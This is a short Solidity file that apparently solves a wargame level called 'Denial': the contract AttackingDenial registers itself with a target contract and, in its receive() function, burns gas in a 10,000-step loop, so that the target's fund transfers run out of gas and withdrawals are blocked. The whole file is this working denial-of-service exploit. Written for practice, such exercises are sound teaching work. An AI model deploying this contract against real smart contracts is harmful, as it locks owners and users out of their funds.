// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        uint wastingGas = 1;
        for (uint i=0; i<10000; i++) {
            wastingGas = wastingGas + i;
        }
    }
}
